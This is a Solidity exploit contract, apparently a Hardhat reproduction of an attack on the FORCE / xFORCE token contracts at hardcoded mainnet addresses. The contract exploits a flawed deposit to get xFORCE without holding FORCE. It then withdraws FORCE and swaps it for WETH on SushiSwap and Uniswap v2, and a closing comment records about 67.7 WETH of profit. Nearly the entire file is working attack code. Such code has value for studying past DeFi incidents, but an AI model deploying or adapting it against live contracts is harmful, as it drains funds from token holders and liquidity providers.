// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

import "hardhat/console.sol";
import "./IUniswapV2Router02.sol";

interface IForce {
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
}

interface IERC20 {
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function approve(address spender, uint256 amount) external returns (bool);
}

contract Attack {
    address xForceAddr = 0xe7f445B93eB9CDaBfe76541Cc43Ff8dE930A58E6;
    address forceAddr = 0x6807D7f7dF53b7739f6438EABd40Ab8c262c0aa8;

    // Mint a huge amount of FORCE
    function getForce() internal {
        uint256 amountToDeposit = 1e30;
        IForce(xForceAddr).deposit(amountToDeposit);
        uint256 amountToWithdraw = IERC20(xForceAddr).balanceOf(address(this));
        console.log("Amount of minted FORCE is: ", amountToWithdraw);
        IForce(xForceAddr).withdraw(amountToWithdraw);        
    }

    // Get FORCE for free and swap them for WETH
    function exploit() public {
        getForce();
        convert_force_to_weth(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);  // SushiSwap
        getForce();
        convert_force_to_weth(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);  // Uniswap v2
    }

    function convert_force_to_weth(address swapRouter) internal {
        address wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address[] memory path = new address[](2);
        path[0] = forceAddr;
        path[1] = wethAddr;
        uint256 forceBalance = IERC20(forceAddr).balanceOf(address(this));
        require(IERC20(forceAddr).approve(swapRouter, uint256(-1)), "approve failed");
        IUniswapV2Router02(swapRouter).swapExactTokensForTokens(forceBalance, 1, path, address(this), block.timestamp);
    }

    function checkBalance() public view {
        address wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        uint256 balance = IERC20(forceAddr).balanceOf(address(this));
        console.log("[ATK] FORCE Balance is: ", balance);
        balance = IERC20(wethAddr).balanceOf(address(this));
        console.log("[ATK] WETH Balance is: ", balance);
    }
}


// -- Profit
// 67,721228744901072581 WETH @ 2k / ETH